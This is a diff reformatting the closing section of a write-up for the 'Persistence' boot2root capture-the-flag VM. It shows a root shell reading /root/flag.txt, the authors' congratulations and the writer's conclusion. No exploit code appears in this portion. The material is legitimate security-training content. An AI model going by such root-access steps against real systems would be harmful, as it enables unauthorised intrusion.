@@ -994,35 +988,35 @@ uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconf
 And, as proof, we cat the flag!
 
 ```bash Persistence w00t
-sh-4.1# cat /root/flag.txt 
-              .d8888b.  .d8888b. 888    
-             d88P  Y88bd88P  Y88b888    
-             888    888888    888888    
-888  888  888888    888888    888888888 
-888  888  888888    888888    888888    
-888  888  888888    888888    888888    
-Y88b 888 d88PY88b  d88PY88b  d88PY88b.  
+sh-4.1# cat /root/flag.txt
+              .d8888b.  .d8888b. 888
+             d88P  Y88bd88P  Y88b888
+             888    888888    888888
+888  888  888888    888888    888888888
+888  888  888888    888888    888888
+888  888  888888    888888    888888
+Y88b 888 d88PY88b  d88PY88b  d88PY88b.
  "Y8888888P"  "Y8888P"  "Y8888P"  "Y888
 
 Congratulations!!! You have the flag!
 
-We had a great time coming up with the 
-challenges for this boot2root, and we 
-hope that you enjoyed overcoming them. 
+We had a great time coming up with the
+challenges for this boot2root, and we
+hope that you enjoyed overcoming them.
 
-Special thanks goes out to @VulnHub for 
-hosting Persistence for us, and to 
-@recrudesce for testing and providing 
-valuable feedback! 
+Special thanks goes out to @VulnHub for
+hosting Persistence for us, and to
+@recrudesce for testing and providing
+valuable feedback!
 
-Until next time, 
+Until next time,
       sagi- & superkojiman
 ```
 
-##conclusion
+## conclusion
 Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- && superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!
 
-##thats not all
+## thats not all
 There are however a few more things I'd like to try.
 
 - Find if and how we can root Persistence using `sysadmin-tool`
